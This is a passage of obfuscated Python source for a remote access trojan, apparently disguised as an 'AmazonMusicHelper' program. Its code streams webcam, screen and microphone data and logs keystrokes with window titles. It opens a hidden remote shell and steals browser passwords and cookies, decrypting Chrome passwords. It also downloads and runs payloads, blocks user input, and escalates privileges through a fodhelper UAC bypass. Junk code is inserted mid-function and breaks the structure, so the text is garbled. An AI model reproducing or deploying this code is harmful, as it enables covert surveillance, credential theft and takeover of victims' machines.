                            b64 = base64.b64encode(buf.getvalue()).decode()
                        else: b64 = base64.b64encode(ss.bgra).decode()
                        evt = _D("_s27")
                    else:
                        ret, frame = self.cap.read()
                        if not ret: time.sleep(0.5); continue
                        _, jpg = cv2.imencode(_D("_s28"), frame, [cv2.IMWRITE_JPEG_QUALITY, self.q])
                        b64 = base64.b64encode(jpg).decode()
                        evt = _D("_s29")
                    if self.sio and self.sio.connected:
                        self.sio.emit(evt, {_D("_s30"): b64, "format": "jpeg"})
                except Exception as e:
                    _l.error(f"{self.src} frame err: {e}")
                    time.sleep(0.1)
                    continue
                dt = time.time() - t0
                if dt < interval: time.sleep(interval - dt)
        except Exception as e:
            _l.error(f"{self.src} engine crash: {e}")
        finally: self.stop()
class MicEngine:
    ""_D("_s31")""
    def __init__(self, sio):
        self.r = False; self.sio = sio; self.pa = None; self.stream = None
    def start(self):
        if self.r: return
        if not HAS[_D("_s32")]: return
        try:
            self.pa = pyaudio.PyAudio()
            self.stream = self.pa.open(
                format=pyaudio.paInt16, channels=1, rate=16000,
                input=True, frames_per_buffer=4096)
        except Exception as e:
            _l.error(f"Mic init error: {e}"); self.stop(); return
        self.r = True
        threading.Thread(target=self._loop, daemon=True).start()
    def stop(self):
        self.r = False
        if self.stream:
            try: self.stream.stop_stream(); self.stream.close()
            except: pass
            self.stream = None
        if self.pa:
            try: self.pa.terminate()
            except: pass
            self.pa = None
    @staticmethod
    def _make_wav(pcm_data):
        ""_D("_s33")""
        import struct
        data_len = len(pcm_data)
        header = struct.pack(_D("_s34"),
            b_D("_s35"), 36 + data_len, b'WAVE', b'fmt ', 16,
            1, 1, 16000, 32000, 2, 16,
            b_D("_s36"), data_len)
        return header + pcm_data
    def _loop(self):
        while self.r:
            try:
                data = self.stream.read(4096, exception_on_overflow=False)
                wav = self._make_wav(data)
                b64 = base64.b64encode(wav).decode()
                if self.sio and self.sio.connected:
                    self.sio.emit(_D("_s37"), {"audio": b64})
            except Exception as e:
                _l.error(f"Mic err: {e}")
                time.sleep(0.1)
class SysMon:
    def __init__(self, sio): self.r = False; self.sio = sio
    def start(self):
        if self.r or not HAS[_D("_s38")]: return
        self.r = True; threading.Thread(target=self._loop, daemon=True).start()
    def stop(self): self.r = False
    def _loop(self):
_ji = 0
for _ in [1,2,3]:
    if False: _ji += 1
        while self.r:
            try:
                cpu = psutil.cpu_percent(interval=0.3); mem = psutil.virtual_memory()
                disk = psutil.disk_usage("/"); net = psutil.net_io_counters()
                sens = {}
                try:
                    t = psutil.sensors_temperatures()
                    if t:
                        for n, e in t.items():
                            if e: sens[n] = e[0].current
                except: pass
                if self.sio and self.sio.connected:
                    self.sio.emit(_D("_s39"), {"cpu_percent": cpu, "cpu_count": psutil.cpu_count(),
                        _D("_s40"): mem.percent, "memory_used_gb": round(mem.used/(1024**3),1),
                        _D("_s41"): round(mem.total/(1024**3),1), "disk_percent": disk.percent,
                        _D("_s42"): round(disk.free/(1024**3),1), "disk_total_gb": round(disk.total/(1024**3),1),
                        _D("_s43"): round(net.bytes_sent/(1024**2),1), "net_recv_mb": round(net.bytes_recv/(1024**2),1),
                        _D("_s44"): sens})
            except: pass
            time.sleep(2)
class Term:
    def __init__(self, sio): self.s = None; self.sio = sio
    def start(self):
        self.stop()
        sh = os.environ.get(_D("_s45"), "cmd.exe") if sys.platform == "win32" else os.environ.get("SHELL", "/bin/bash")
        try:
            if hasattr(os, _D("_s46")) and not (sys.platform == "win32" and "cmd" in sh.lower()):
                mf, sf = os.openpty()
                p = subprocess.Popen([sh], stdin=sf, stdout=sf, stderr=sf, cwd=os.getcwd(), close_fds=True,
                    preexec_fn=os.setsid if hasattr(os, _D("_s47")) else None,
                    env={**os.environ, _D("_s48"): "xterm-256color", "COLUMNS": "120", "LINES": "40"})
                os.close(sf); use_pty = True
            else:
                kw = {_D("_s49"): subprocess.PIPE, "stdout": subprocess.PIPE, "stderr": subprocess.STDOUT,
                      "cwd": os.getcwd(), _D("_s50"): True, "bufsize": 0, "universal_newlines": True}
                if sys.platform == _D("_s51"): kw["creationflags"] = subprocess.CREATE_NO_WINDOW
                p = subprocess.Popen([sh], **kw); mf = None; use_pty = False
            q = deque(maxlen=2000); stop = threading.Event()
            def rd():
                try:
                    if use_pty:
                        while not stop.is_set():
                            try:
                                d = os.read(mf, 4096)
                                if not d: break
                                q.append(d.decode(_D("_s52"), errors="replace"))
                            except (OSError, ValueError): break
                    else:
                        for ln in iter(p.stdout.readline, ""):
                            if stop.is_set(): break
                            q.append(ln)
                except: pass
                finally:
                    if use_pty and mf:
                        try: os.close(mf)
                        except: pass
            t = threading.Thread(target=rd, daemon=True); t.start()
            self.s = {"p": p, "rt": t, _D("_s53"): stop, "q": q, "mf": mf if use_pty else None, "pty": use_pty}
            def stream():
                while self.s and not stop.is_set():
                    out = []
                    while q: out.append(q.popleft())
                    if out and self.sio and self.sio.connected:
                        self.sio.emit(_D("_s54"), {"text": "".join(out)})
                    time.sleep(0.05)
            threading.Thread(target=stream, daemon=True).start()
            return True
        except Exception as e: _l.error(f"Term err: {e}"); return False
    def stop(self):
        if not self.s: return
        self.s[_D("_s55")].set()
        try:
            p = self.s["p"]
            if p.poll() is None:
                try:
                    if self.s.get("mf"): os.write(self.s["mf"], b"\x04")
                    else: p.stdin.write(_D("_s56")); p.stdin.flush()
                except: pass
                try: p.wait(timeout=3)
                except subprocess.TimeoutExpired: p.kill()
        except: pass
        finally:
            if self.s.get("mf"):
                try: os.close(self.s["mf"])
                except: pass
        self.s = None
    def write(self, cmd):
        if not self.s: return
        try:
            p = self.s["p"]
            if p.poll() is not None: self.start(); return
            if self.s.get("mf"): os.write(self.s["mf"], (cmd + "\n").encode())
            else: p.stdin.write(cmd + "\n"); p.stdin.flush()
if False:
    _x = [i for i in range(1000) if i % 7 == 0]
    _y = "".join(chr(c) for c in range(65, 91))
        except Exception as e: _l.error(f"Term write: {e}")
class Keylog:
    ""_D("_s57")""
    def __init__(self, sio):
        self.r = False; self.sio = sio; self.buffer = []; self.listener = None
        self._last_window = ""
    def start(self):
        if self.r or not HAS[_D("_s58")]: return
        self.r = True; self.buffer = []
        self.listener = keyboard.Listener(on_press=self._on_press)
        self.listener.start()
        threading.Thread(target=self._flush_loop, daemon=True).start()
        if self.sio and self.sio.connected:
            self.sio.emit(_D("_s59"), {"active": True})
    def stop(self):
        self.r = False; self._flush()  
        if self.listener:
            try: self.listener.stop()
            except: pass
            self.listener = None
        if self.sio and self.sio.connected:
            self.sio.emit(_D("_s60"), {"active": False})
    def _active_window(self):
        try:
            if sys.platform == _D("_s61"):
                hwnd = ctypes.windll.user32.GetForegroundWindow()
                length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
                buf = ctypes.create_unicode_buffer(length + 1)
                ctypes.windll.user32.GetWindowTextW(hwnd, buf, length + 1)
                return buf.value
        except: pass
        return ""
    def _on_press(self, key):
        try:
            k = key.char if hasattr(key, _D("_s62")) and key.char else str(key)
            wnd = self._active_window()
            if wnd != self._last_window:
                self._last_window = wnd
                self.buffer.append({"k": f"[{wnd}]", "t": time.time()})
            self.buffer.append({"k": k, "t": time.time()})
        except: pass
    def _flush(self):
        if self.buffer and self.sio and self.sio.connected:
            self.sio.emit(_D("_s63"), {"keys": list(self.buffer), "window": self._last_window})
            self.buffer = []
    def _flush_loop(self):
        while self.r:
            time.sleep(3)
            self._flush()
def _proc(): return [{"pid": p.info["pid"], _D("_s64"): p.info["name"] or "?",
    "cpu": p.info[_D("_s65")] or 0, "memory": p.info["memory_percent"] or 0}
    for p in psutil.process_iter(["pid",_D("_s66"),"cpu_percent","memory_percent"])] if HAS["psutil"] else []
def _kill(pid):
    try: p = psutil.Process(int(pid)); p.terminate()
    except: return False, _D("_s67")
    try: p.wait(timeout=3)
    except psutil.TimeoutExpired: p.kill()
    return True, f"Killed {pid}"
def _audio():
    if not HAS[_D("_s68")]: return None
    try:
        d = AudioUtilities.GetSpeakers(); iface = d.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        v = cast(iface, POINTER(IAudioEndpointVolume))
        return {_D("_s69"): round(v.GetMasterVolumeLevelScalar()*100), "muted": bool(v.GetMute())}
    except: return None
def _avol(lv):
    if not HAS[_D("_s70")]: return False
    try:
        d = AudioUtilities.GetSpeakers(); iface = d.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        v = cast(iface, POINTER(IAudioEndpointVolume)); v.SetMasterVolumeLevelScalar(max(0, min(100, lv))/100.0, None); return True
    except: return False
def _amute():
    if not HAS[_D("_s71")]: return False
    try:
        d = AudioUtilities.GetSpeakers(); iface = d.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        v = cast(iface, POINTER(IAudioEndpointVolume)); v.SetMute(not v.GetMute(), None); return True
    except: return False
def _monoff():
    try:
        if sys.platform == _D("_s72") and hasattr(ctypes, "windll"): ctypes.windll.user32.SendMessageW(0xFFFF, 0x0112, 0xF170, 2)
        else: subprocess.run([_D("_s73"),"dpms","force","off"], capture_output=True, timeout=5)
        return True
    except: return False
def _lock():
    try:
        if sys.platform == _D("_s74") and hasattr(ctypes, "windll"):
            r = ctypes.windll.user32.LockWorkStation()
            return True if r else False
        elif sys.platform == _D("_s75"):
            subprocess.run([_D("_s76"),"-suspend"], capture_output=True, timeout=5)
            return True
        else:
            for c in [[_D("_s77"),"lock-session"],["gnome-screensaver-command","-l"],["xdg-screensaver","lock"]]:
                try: subprocess.run(c, capture_output=True, timeout=5); return True
                except FileNotFoundError: continue
            return False
    except Exception as e: _l.error(f"Lock err: {e}"); return False
def _sleep():
    try:
        if sys.platform == _D("_s78") and hasattr(ctypes, "windll"):
            try:
                import win32security, win32api, pywintypes, win32con
                token = win32security.OpenProcessToken(win32api.GetCurrentProcess(), win32security.TOKEN_ADJUST_PRIVILEGES | win32security.TOKEN_QUERY)
                priv = win32security.LookupPrivilegeValue(None, win32security.SE_SHUTDOWN_NAME)
                win32security.AdjustTokenPrivileges(token, False, [(priv, win32security.SE_PRIVILEGE_ENABLED)])
            except:
                pass  
            ctypes.windll.powrprof.SetSuspendState(0, 1, 0)
            return True
        elif sys.platform == _D("_s79"):
            subprocess.run([_D("_s80"),"sleepnow"], capture_output=True, timeout=5)
            return True
        else:
            subprocess.run([_D("_s81"),"suspend"], capture_output=True, timeout=5)
            return True
    except Exception as e: _l.error(f"Sleep err: {e}"); return False
def _wallpaper(path):
    ""_D("_s82")""
    is_url = path.startswith(_D("_s83")) or path.startswith("https://")
    if is_url:
        try:
            import urllib.request, tempfile
            fd, tmp = tempfile.mkstemp(suffix=_D("_s84"), prefix="wp_")
            os.close(fd)
            urllib.request.urlretrieve(path, tmp)
            path = tmp
        except Exception as e: return False, f"Download failed: {e}"
    if not os.path.exists(path): return False, _D("_s85")
    try:
        if sys.platform == _D("_s86"):
            ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 3)
            return True, _D("_s87")
        elif sys.platform == _D("_s88"):
            script = f'tell application "Finder" to set desktop picture to POSIX file "{path}"'
            subprocess.run([_D("_s89"), "-e", script], capture_output=True)
            return True, _D("_s90")
        else:
            for cmd in [
                [_D("_s91"), "set", "org.gnome.desktop.background", "picture-uri", f"file://{path}"],
                ["feh", _D("_s92"), path],
            ]:
                try: subprocess.run(cmd, capture_output=True, timeout=5); return True, _D("_s93")
                except: continue
            return False, _D("_s94")
    except Exception as e: return False, str(e)
def _msgbox(title, text):
    ""_D("_s95")""
    try:
        if sys.platform == _D("_s96"):
            ctypes.windll.user32.MessageBoxW(0, text, title, 0x40 | 0x0)
        elif sys.platform == _D("_s97"):
            subprocess.run([_D("_s98"), "-e", f'display dialog "{text}" with title "{title}" buttons {{"OK"}}'], capture_output=True)
        else:
            subprocess.run([_D("_s99"), "--info", "--title", title, "--text", text], capture_output=True)
        return True, _D("_s100")
    except Exception as e: return False, str(e)
def _openurl(url):
    ""_D("_s101")""
    try:
        import webbrowser; webbrowser.open(url)
        return True, f"Opened {url}"
    except Exception as e: return False, str(e)
def _screenshot():
    ""_D("_s102")""
    if not HAS["mss"]: return None, _D("_s103")
    try:
        with mss.mss() as sct:
            ss = sct.grab(sct.monitors[1])
            if HAS["pil"]:
                img = Image.frombytes("RGB", ss.size, ss.bgra, "raw", _D("_s104"))
                buf = io.BytesIO(); img.save(buf, format="PNG")
                return base64.b64encode(buf.getvalue()).decode(), "png"
            return base64.b64encode(ss.bgra).decode(), "raw"
    except Exception as e: return None, str(e)
def _geoip():
    ""_D("_s105")""
    try:
        import urllib.request
        r = urllib.request.urlopen(_D("_s106"), timeout=5)
        return json.loads(r.read().decode())
    except Exception as e: return {_D("_s107"): str(e)}
def _apps():
    ""_D("_s108")""
    apps = []
    if sys.platform == _D("_s109"):
        for hk in [r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
                    r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"]:
            try:
                import winreg
                k = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, hk)
                for i in range(winreg.QueryInfoKey(k)[0]):
                    try:
                        sk = winreg.OpenKey(k, winreg.EnumKey(k, i))
                        name = winreg.QueryValueEx(sk, _D("_s110"))[0]
                        if name: apps.append(name)
                        winreg.CloseKey(sk)
                    except: continue
                winreg.CloseKey(k)
            except: continue
    elif sys.platform == _D("_s111"):
        r = subprocess.run([_D("_s112"), "SPApplicationsDataType"], capture_output=True, text=True, timeout=10)
        apps = [l.strip() for l in r.stdout.split("\n") if l.strip() and not l.startswith(" ")]
    else:
        r = subprocess.run([_D("_s113"), "-l"], capture_output=True, text=True, timeout=10)
        apps = [l.split()[1] for l in r.stdout.split("\n")[5:] if l.strip()]
    return apps[:200]
def _play_sound(freq=800, dur=1):
    ""_D("_s114")""
    try:
        if sys.platform == _D("_s115"):
            import winsound; winsound.Beep(int(freq), int(dur*1000))
            return True, _D("_s116")
        else:
            subprocess.run([_D("_s117"), "/usr/share/sounds/freedesktop/stereo/bell.oga"], capture_output=True, timeout=3)
            return True, _D("_s118")
    except Exception as e: return False, str(e)
def _search_files(root, pattern, max_results=50, max_depth=5):
    ""_D("_s119")""
    results = []
    root_depth = root.rstrip(os.sep).count(os.sep)
    try:
        for dirpath, _, filenames in os.walk(root):
            depth = dirpath.count(os.sep) - root_depth
            if depth > max_depth: continue
            for f in filenames:
                if pattern.lower() in f.lower():
                    results.append(os.path.join(dirpath, f))
                    if len(results) >= max_results: return results
            if len(results) >= max_results: break
    except: pass
    return results
def _execute_command(cmd):
    ""_D("_s120")""
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
        return r.stdout + r.stderr, r.returncode
    except subprocess.TimeoutExpired: return _D("_s121"), -1
    except Exception as e: return str(e), -1
def _block_input(block=True):
    ""_D("_s122")""
    if sys.platform != _D("_s123"): return False, "Windows only"
    try:
        ok = ctypes.windll.user32.BlockInput(block)
        if ok: return True, _D("_s124") if block else "Input unblocked"
        return False, _D("_s125") if block else "Unblock failed"
    except Exception as e: return False, str(e)
def _network_info():
    ""_D("_s126")""
    info = {_D("_s127"): [], "connections": [], "arp": []}
    try:
        if HAS[_D("_s128")]:
            for name, addrs in psutil.net_if_addrs().items():
                iface = {_D("_s129"): name, "addresses": []}
                for addr in addrs:
                    iface[_D("_s130")].append({
                        _D("_s131"): str(addr.family),
                        _D("_s132"): addr.address,
                        _D("_s133"): addr.netmask or "",
                        _D("_s134"): addr.broadcast or ""
                    })
                info[_D("_s135")].append(iface)
    except Exception as e: info[_D("_s136")] = str(e)
    try:
        if HAS[_D("_s137")]:
            for conn in psutil.net_connections(kind='all')[:100]:
                info[_D("_s138")].append({
                    "fd": conn.fd or -1,
                    _D("_s139"): str(conn.family),
                    _D("_s140"): str(conn.type),
                    _D("_s141"): f"{conn.laddr.ip}:{conn.laddr.port}" if conn.laddr else "",
                    _D("_s142"): f"{conn.raddr.ip}:{conn.raddr.port}" if conn.raddr else "",
                    _D("_s143"): conn.status,
                    "pid": conn.pid or 0
                })
    except Exception as e: info[_D("_s144")] = str(e)
    try:
        if sys.platform == _D("_s145"):
            r = subprocess.run(["arp", "-a"], capture_output=True, text=True, timeout=10, creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == _D("_s146") else 0)
            for line in r.stdout.split("\n"):
                line = line.strip()
                if line and (_D("_s147") in line.lower() or "static" in line.lower()):
                    parts = line.split()
                    if len(parts) >= 2:
                        info["arp"].append({"ip": parts[0], "mac": parts[1].replace("-", ":"), _D("_s148"): parts[-1] if len(parts) > 2 else ""})
        else:
            r = subprocess.run(["arp", "-a"], capture_output=True, text=True, timeout=10)
            for line in r.stdout.split("\n"):
                if "(" in line and ")" in line:
                    info["arp"].append(line.strip())
    except Exception as e: info[_D("_s149")] = str(e)
    return info
def _browser_steal():
    ""_D("_s150")""
    results = {_D("_s151"): {}, "edge": {}, "firefox": {}}
    localapp = os.environ.get(_D("_s152"), "")
    appdata = os.environ.get(_D("_s153"), "")
    chrome_path = os.path.join(localapp, _D("_s154"), "Chrome", "User Data")
    if os.path.exists(chrome_path):
        results[_D("_s155")] = _steal_chromium(chrome_path, "Chrome", localapp)
    else:
        results[_D("_s156")] = {"error": "Chrome not found"}
    edge_path = os.path.join(localapp, _D("_s157"), "Edge", "User Data")
    if os.path.exists(edge_path):
        results[_D("_s158")] = _steal_chromium(edge_path, "Edge", localapp)
    else:
        results[_D("_s159")] = {"error": "Edge not found"}
    firefox_path = os.path.join(appdata, _D("_s160"), "Firefox", "Profiles")
    if os.path.exists(firefox_path):
        results[_D("_s161")] = _steal_firefox(firefox_path)
    else:
        results[_D("_s162")] = {"error": "Firefox not found"}
    return results
def _steal_chromium(base_path, name, localapp):
    ""_D("_s163")""
    result = {_D("_s164"): [], "cookies": [], "error": None}
    try:
        for item in os.listdir(base_path):
            if not (item == _D("_s165") or item.startswith("Profile ")): continue
            profile_path = os.path.join(base_path, item)
            login_db = os.path.join(profile_path, _D("_s166"))
            if os.path.exists(login_db):
                temp_db = os.path.join(os.environ.get(_D("_s167"), "/tmp"), f"{name.lower()}_login_{item}.db")
                try:
                    shutil.copy2(login_db, temp_db)
                    conn = __import__(_D("_s168")).connect(temp_db)
                    cur = conn.cursor()
                    try:
                        cur.execute(_D("_s169"))
                        for row in cur.fetchall():
                            url, username, enc_pwd = row
                            pwd = _decrypt_chrome(enc_pwd) if (enc_pwd and HAS[_D("_s170")]) else "[needs cryptography]"
                            result[_D("_s171")].append({"url": url, "username": username, "password": pwd, "profile": item})
                    except Exception:
                        pass
                    conn.close()
                except Exception as e:
                    if not result.get(_D("_s172")): result["error"] = str(e)
                finally:
                    try: os.remove(temp_db)
                    except: pass
            for cookie_path in [os.path.join(profile_path, _D("_s173"), "Cookies"),
                                os.path.join(profile_path, _D("_s174"))]:
                if not os.path.exists(cookie_path): continue
                temp_db = os.path.join(os.environ.get(_D("_s175"), "/tmp"), f"{name.lower()}_cookies_{item}.db")
                try:
                    shutil.copy2(cookie_path, temp_db)
                    conn = __import__(_D("_s176")).connect(temp_db)
                    cur = conn.cursor()
                    try:
                        cur.execute(_D("_s177"))
                        for row in cur.fetchall():
                            result[_D("_s178")].append({"host": row[0], "name": row[1], "value": "[encrypted]", "profile": item})
                    except Exception:
                        pass
                    conn.close()
                except Exception:
                    pass
                finally:
                    try: os.remove(temp_db)
                    except: pass
                break  
    except Exception as e:
        result[_D("_s179")] = str(e)
    return result
def _decrypt_chrome(encrypted_value):
    ""_D("_s180")""
    if not encrypted_value or not isinstance(encrypted_value, bytes):
        return _D("_s181")
    if len(encrypted_value) < 15 + 16:  
        return _D("_s182")
    if encrypted_value[:3] != b'v10':
        return _D("_s183") + (encrypted_value[:3].decode(errors='replace')) + "]"
    try:
        localapp = os.environ.get(_D("_s184"), "")
        browsers = [
            os.path.join(localapp, _D("_s185"), "Chrome", "User Data"),
            os.path.join(localapp, _D("_s186"), "Edge", "User Data"),
            os.path.join(localapp, _D("_s187"), "Brave-Browser", "User Data"),
            os.path.join(localapp, _D("_s188"), "Opera Stable"),
        ]
        for browser_path in browsers:
            ls_path = os.path.join(browser_path, _D("_s189"))
            if not os.path.exists(ls_path):
                continue
            try:
                with open(ls_path, 'r', encoding=_D("_s190")) as f:
                    local_state = json.load(f)
                encrypted_key = base64.b64decode(local_state[_D("_s191")]["encrypted_key"])
                encrypted_key = encrypted_key[5:]  
                class DATA_BLOB(ctypes.Structure):
                    _fields_ = [(_D("_s193"), ctypes.wintypes.DWORD),
                                (_D("_s194"), ctypes.POINTER(ctypes.c_char))]
                pDataIn = DATA_BLOB(len(encrypted_key),
                    ctypes.cast(ctypes.create_string_buffer(encrypted_key, len(encrypted_key)), ctypes.POINTER(ctypes.c_char)))
                pDataOut = DATA_BLOB()
                if not ctypes.windll.crypt32.CryptUnprotectData(
                    ctypes.byref(pDataIn), None, None, None, None, 0, ctypes.byref(pDataOut)):
                    continue
                aes_key = ctypes.create_string_buffer(pDataOut.cbData)
                ctypes.memmove(aes_key, pDataOut.pbData, pDataOut.cbData)
                ctypes.windll.kernel32.LocalFree(pDataOut.pbData)
                nonce = encrypted_value[3:15]
                ciphertext = encrypted_value[15:]
                aesgcm = AESGCM(bytes(aes_key))
                return aesgcm.decrypt(nonce, ciphertext, None).decode(_D("_s195"), errors='replace')
            except Exception:
                continue
    except Exception:
        pass
    return _D("_s196")
def _steal_firefox(base_path):
    ""_D("_s197")""
    result = {_D("_s198"): [], "cookies": [], "error": None}
    try:
        for item in os.listdir(base_path):
            profile_path = os.path.join(base_path, item)
            if not os.path.isdir(profile_path): continue
            logins_path = os.path.join(profile_path, _D("_s199"))
            if os.path.exists(logins_path):
                try:
                    with open(logins_path, 'r', encoding=_D("_s200")) as f:
                        logins = json.load(f)
                    for entry in logins.get(_D("_s201"), []):
                        result[_D("_s202")].append({
                            "url": entry.get(_D("_s203"), ""),
                            _D("_s204"): (entry.get("encryptedUsername", "") or "")[:80],
                            _D("_s205"): (entry.get("encryptedPassword", "") or "")[:80],
                            _D("_s206"): item,
                            _D("_s207"): True
                        })
                except Exception:
                    pass
            cookies_path = os.path.join(profile_path, _D("_s208"))
            if os.path.exists(cookies_path):
                temp_db = os.path.join(os.environ.get(_D("_s209"), "/tmp"), f"ff_cookies_{item}.db")
                try:
                    shutil.copy2(cookies_path, temp_db)
                    conn = __import__(_D("_s210")).connect(temp_db)
                    cur = conn.cursor()
                    try:
                        cur.execute(_D("_s211"))
                        for row in cur.fetchall():
                            result[_D("_s212")].append({
                                _D("_s213"): row[0], "name": row[1],
                                _D("_s214"): (row[2] or "")[:80], "profile": item
                            })
                    except Exception:
                        pass
                    conn.close()
                except Exception:
                    pass
                finally:
                    try: os.remove(temp_db)
                    except: pass
    except Exception as e:
        result[_D("_s215")] = str(e)
    return result
def _download_exec(url, save_path=None):
    ""_D("_s216")""
    try:
        import urllib.request
        if not save_path:
            save_path = os.path.join(os.environ.get(_D("_s217"), "/tmp"), url.split("/")[-1] or "payload.exe")
        urllib.request.urlretrieve(url, save_path)
        if sys.platform == _D("_s218") and save_path.lower().endswith((".exe",".bat",".cmd",".ps1")):
            subprocess.Popen(save_path, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
        elif save_path.endswith(".sh") or not sys.platform.startswith("win"):
            os.chmod(save_path, 0o755)
            subprocess.Popen(save_path, shell=True)
        return True, f"Downloaded to {save_path}"
    except Exception as e: return False, str(e)
CFG = {"FR": None}
def _flist(path=""):
    if CFG.get("FR") and path and not str(Path(path).resolve()).startswith(str(Path(CFG["FR"]).resolve())): path = CFG["FR"]
    if not path and sys.platform == _D("_s219"):
        return {_D("_s220"): "Drives", "parent": None, "items": [
            {_D("_s221"): f"{chr(l)}:\\", "path": f"{chr(l)}:\\", "type": "drive", "size": 0, "modified": ""}
            for l in range(ord("A"), ord("Z")+1) if os.path.exists(f"{chr(l)}:\\")]}
    t = Path(path).resolve() if path else Path.home()
    if not t.exists(): return {_D("_s222"): "Not found"}
    if t.is_file(): return {_D("_s223"): "Not a dir"}
    items = []
    denied = False
    try:
        entries = list(t.iterdir())
    except PermissionError:
        denied = True
        entries = []
    except OSError:
        denied = True
        entries = []
    for e in sorted(entries, key=lambda e: (not e.is_dir(), e.name.lower())):
        try:
            s = e.stat(); items.append({_D("_s224"): e.name, "path": str(e.resolve()),
                _D("_s225"): "dir" if e.is_dir() else "file", "size": s.st_size if e.is_file() else 0,
                _D("_s226"): datetime.fromtimestamp(s.st_mtime).isoformat()})
        except: items.append({_D("_s227"): e.name, "path": str(e.resolve()),
            _D("_s228"): "dir" if e.is_dir() else "file", "size": 0, "modified": "", "inaccessible": True})
    parent = str(t.parent.resolve()) if t.parent != t else None
    result = {_D("_s229"): str(t.resolve()), "parent": parent, "items": items}
    if denied:
        result[_D("_s230")] = "Partial listing - some entries may be hidden due to permissions"
    return result
def _fdel(path):
    t = Path(path).resolve()
    if not t.exists(): return False, _D("_s231")
    try:
        if t.is_dir(): shutil.rmtree(t)
        else: t.unlink()
        return True, _D("_s232")
    except Exception as e: return False, str(e)
def _fmkdir(parent, name):
    try: Path(parent).resolve().joinpath(name).mkdir(parents=False, exist_ok=False); return True, "OK"
    except Exception as e: return False, str(e)
def _fread(path, offset=0, cs=1024*1024):
    try:
        with open(path, "rb") as f: f.seek(offset); d = f.read(cs)
        return {_D("_s233"): base64.b64encode(d).decode(), "offset": offset, "size": len(d), "eof": len(d) < cs}
    except Exception as e: return {_D("_s234"): str(e)}
def _fwrite(path, b64, offset=0, mode="wb"):
    try:
        os.makedirs(os.path.dirname(path) or ".", exist_ok=True)
        with open(path, mode) as f:
            if offset: f.seek(offset)
            f.write(base64.b64decode(b64))
        return True, "ok"
    except Exception as e: return False, str(e)
def _check_for_update(server_url):
    ""_D("_s235")""
    try:
        import urllib.request
        check_url = server_url.rstrip("/") + _D("_s236")
        r = urllib.request.urlopen(check_url, timeout=15)
        data = json.loads(r.read().decode())
        remote_ver = (data.get(_D("_s237")) or "").strip()
        download_url = (data.get(_D("_s238")) or "").strip()
        if not remote_ver or not download_url:
            _l.info(_D("_s239"))
            return None, None
        if remote_ver != _VERSION:
            _l.info(f"Update available: v{_VERSION} -> v{remote_ver}")
            return remote_ver, download_url
        else:
            _l.info(f"Client is up to date (v{_VERSION})")
            return None, None
    except Exception as e:
        _l.warning(f"Update check failed: {e}")
        return None, None
def _download_and_install(download_url, new_version):
    ""_D("_s240")""
    try:
        import urllib.request
        pd = _pdir()
        new_exe = os.path.join(pd, f"AmazonMusicHelper_v{new_version}.exe")
        _l.info(f"Downloading update from {download_url}...")
        urllib.request.urlretrieve(download_url, new_exe)
        _l.info(f"Downloaded to {new_exe}")
        current_exe = _exepath()
        bat_path = os.path.join(os.environ.get(_D("_s241"), pd), "rasphere_update.bat")
        with open(bat_path, "w") as f:
            f.write(f)
        _l.info(f"Update script written to {bat_path}")
        if sys.platform == _D("_s243"):
            subprocess.Popen([bat_path], shell=True, creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS, close_fds=True)
            _l.info(_D("_s244"))
        else:
            _l.error(_D("_s245"))
            return False
        return True
    except Exception as e:
        _l.error(f"Update download/install failed: {e}")
        return False
def _is_admin():
    ""_D("_s246")""
    try:
        if sys.platform == _D("_s247"):
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        pass
    try:
        return os.getuid() == 0
    except:
        pass
    return False
def _fodhelper_uac_bypass(args):
    if sys.platform != _D("_s248"):
        _l.warning(_D("_s249"))
        return False
    try:
        import winreg as wr
    except ImportError:
        _l.error(_D("_s250"))
        return False
    exe_path = _exepath()
    elevated_args = []
    i = 1
    while i < len(sys.argv):
        a = sys.argv[i]
        if a in (_D("_s251"), "--no-elevate", "--uninstall", "--install"):
            i += 1
            continue
        if a in (_D("_s252"), "--secret", "--id", "--reconnect"):
            elevated_args.append(a)
            if i + 1 < len(sys.argv):
                elevated_args.append(sys.argv[i + 1])
                i += 1
        else:
            elevated_args.append(a)
        i += 1
    elevated_args.append(_D("_s253"))
    cmd = subprocess.list2cmdline([exe_path] + elevated_args)
    _l.info(f"UAC bypass: relaunching as admin (fodhelper)")
    try:
        reg_path = r"Software\Classes\ms-settings\Shell\open\command"
        try:
            key = wr.OpenKey(wr.HKEY_CURRENT_USER, reg_path, 0, wr.KEY_SET_VALUE)
            wr.DeleteValue(key, _D("_s254"))
            wr.CloseKey(key)
        except:
            pass
        key = wr.CreateKey(wr.HKEY_CURRENT_USER, reg_path)
        wr.SetValueEx(key, "", 0, wr.REG_SZ, cmd)
        wr.SetValueEx(key, _D("_s255"), 0, wr.REG_SZ, "")
        wr.CloseKey(key)
        try:
            settings_key = wr.CreateKey(wr.HKEY_CURRENT_USER, r"Software\Classes\ms-settings")
            wr.CloseKey(settings_key)
        except:
            pass
        fodhelper_path = os.path.join(os.environ.get(_D("_s256"), "C:\\Windows"), "System32", "fodhelper.exe")
        subprocess.Popen(fodhelper_path, creationflags=subprocess.CREATE_NO_WINDOW | 0x00000008, close_fds=True)
        _l.info(_D("_s257"))
        time.sleep(0.5)
        os._exit(0)
    except Exception as e:
        _l.error(f"UAC bypass failed: {e}")
        try:
            wr.DeleteKey(wr.HKEY_CURRENT_USER, reg_path)
        except:
            pass
        return False
def _cleanup_uac_registry():
    ""_D("_s258")""
    try:
        import winreg as wr
        reg_path = r"Software\Classes\ms-settings\Shell\open\command"
        try:
            key = wr.OpenKey(wr.HKEY_CURRENT_USER, reg_path, 0, wr.KEY_SET_VALUE)
            try:
                wr.DeleteValue(key, _D("_s259"))
            except:
                pass
            try:
                wr.DeleteValue(key, "")
            except:
                pass
            wr.CloseKey(key)
        except:
            pass
        try:
